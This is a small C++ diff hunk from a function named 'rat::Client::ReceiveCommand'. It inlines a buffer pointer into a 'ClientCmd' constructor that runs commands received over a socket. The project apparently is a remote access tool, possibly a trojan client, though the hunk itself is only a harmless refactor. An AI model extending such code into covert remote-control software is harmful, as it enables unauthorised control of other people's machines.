@@ -71,8 +71,7 @@ void rat::Client::ReceiveCommand()
 		{
 			continue;
 		}
-		char* buff = std::to_address(v.begin());
-		ClientCmd cmd(sock_, buff, static_cast<int>(v.size()));
+		ClientCmd cmd(sock_, std::to_address(v.begin()), static_cast<int>(v.size()));
 		if (cmd.execute())
 		{
 			using enum rat::Command::CommandType;
